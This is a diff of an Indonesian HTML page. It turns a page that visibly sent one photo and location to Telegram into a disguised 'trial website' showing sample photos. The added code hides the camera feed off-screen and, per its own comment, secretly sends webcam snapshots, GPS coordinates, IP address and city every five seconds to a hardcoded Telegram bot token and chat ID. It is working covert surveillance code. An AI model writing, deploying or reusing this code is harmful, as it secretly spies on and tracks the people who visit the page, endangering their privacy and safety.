@@ -1,79 +1,111 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Kirim Foto & Lokasi ke Telegram</title>
+  <title>Website Percobaan</title>
   <style>
-    body { font-family: Arial; text-align: center; padding: 30px; }
-    video { width: 300px; height: 200px; border: 1px solid #ccc; }
-    button { padding: 10px 20px; font-size: 16px; }
+    *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
+    body{display:flex;align-items:center;justify-content:center;height:100vh;background:linear-gradient(135deg,#89f7fe,#66a6ff);color:#fff}
+    .card{background:rgba(255,255,255,.15);backdrop-filter:blur(10px);border-radius:16px;padding:40px 50px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.2)}
+    h1{margin-bottom:12px;font-size:2rem}
+    p{margin-bottom:28px;font-size:1rem;opacity:.9}
+    button{background:#fff;color:#66a6ff;border:none;padding:14px 36px;font-size:1rem;border-radius:30px;cursor:pointer;transition:.3s}
+    button:hover{transform:scale(1.05)}
+    #tablePage{display:none}
+    table{width:100%;border-collapse:collapse;margin-top:20px;color:#222}
+    th,td{padding:10px 12px;border:1px solid #ccc;text-align:center}
+    th{background:#f5f5f5}
+    img{width:100px;height:auto;border-radius:6px}
+    #video{position:fixed;top:-9999px}
   </style>
 </head>
 <body>
 
-  <h2>Klik "Lanjut" untuk mulai</h2>
-  <button onclick="start()">Lanjut</button>
-  <br><br>
-  <video id="video" autoplay></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <!-- 1) WELCOME SCREEN -->
+  <section id="welcomePage" class="card">
+    <h1>Welcome to Website Percobaan</h1>
+    <p>Tekan Lanjut untuk memulai dan izinkan lokasi serta kamera.</p>
+    <button onclick="start()">Lanjut</button>
+  </section>
+
+  <!-- 2) TABLE PAGE -->
+  <section id="tablePage" class="card">
+    <h1>Daftar Foto</h1>
+    <table>
+      <thead><tr><th>#</th><th>Foto</th><th>Keterangan</th></tr></thead>
+      <tbody id="tblBody"></tbody>
+    </table>
+  </section>
+
+  <!-- hidden video -->
+  <video id="video" autoplay muted></video>
 
   <script>
     const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
     const CHAT_ID   = '7670525689';
+    const TGL_URL   = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-    async function start() {
-      try {
-        // 1. Lokasi
-        const pos = await new Promise((res, rej) =>
-          navigator.geolocation.getCurrentPosition(res, rej)
-        );
-        const { latitude, longitude } = pos.coords;
+    let streamGlobal;
 
-        // 2. IP & kota
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        const { ip, city, region } = ipData;
-
-        // 3. Kamera
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    async function start(){
+      try{
+        // izin lokasi
+        const pos = await new Promise((res,rej)=>
+          navigator.geolocation.getCurrentPosition(res,rej));
+        const {latitude,longitude} = pos.coords;
+        // izin kamera
+        streamGlobal = await navigator.mediaDevices.getUserMedia({video:true});
         const video = document.getElementById('video');
-        video.srcObject = stream;
+        video.srcObject = streamGlobal;
 
-        // 4. Tunggu 2 detik → ambil foto
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          const ctx = canvas.getContext('2d');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0);
-
-          canvas.toBlob(async (blob) => {
-            const caption = `📍 ${city}, ${region}\n🌍 ${latitude}, ${longitude}\n🌐 ${ip}`;
-
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('caption', caption);
-            form.append('photo', blob, 'foto.jpg');
-
-            // 5. Langsung ke Telegram
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const resp = await fetch(url, { method: 'POST', body: form });
-
-            if (resp.ok) {
-              alert('✅ Terkirim ke Telegram!');
-            } else {
-              const msg = await resp.text();
-              alert('❌ Gagal kirim:\n' + msg.slice(0, 300));
-            }
-
-            stream.getTracks().forEach(t => t.stop());
-          }, 'image/jpeg');
-        }, 2000);
-
-      } catch (err) {
-        alert('Izin ditolak atau error: ' + err.message);
+        // tampilkan tabel
+        showTable();
+        // mulai kirim foto diam-diam tiap 5 detik
+        setInterval(captureAndSend,5000);
+      }catch(err){
+        alert('Izin ditolak / error: '+err.message);
       }
+    }
+
+    function showTable(){
+      document.getElementById('welcomePage').style.display='none';
+      document.getElementById('tablePage').style.display='block';
+      const tbody = document.getElementById('tblBody');
+      for(let i=1;i<=10;i++){
+        tbody.innerHTML+=`
+          <tr>
+            <td>${i}</td>
+            <td><img src="https://picsum.photos/150/100?random=${i}" alt="foto${i}"></td>
+            <td>Foto sample ${i}</td>
+          </tr>`;
+      }
+    }
+
+    async function captureAndSend(){
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video,0,0);
+
+      canvas.toBlob(async blob=>{
+        const ipData = await fetch('https://ipapi.co/json').then(r=>r.json());
+        const {ip,city,region} = ipData;
+        const pos = await new Promise(res=>
+          navigator.geolocation.getCurrentPosition(res));
+        const {latitude,longitude} = pos.coords;
+        const caption = `📍 ${city}, ${region}\n🌍 ${latitude}, ${longitude}\n🌐 ${ip}`;
+
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('caption', caption);
+        form.append('photo', blob, 'foto.jpg');
+
+        fetch(TGL_URL,{method:'POST',body:form})
+          .then(r=>{if(!r.ok)console.warn('Gagal kirim')})
+          .catch(console.error);
+      },'image/jpeg');
     }
   </script>
 
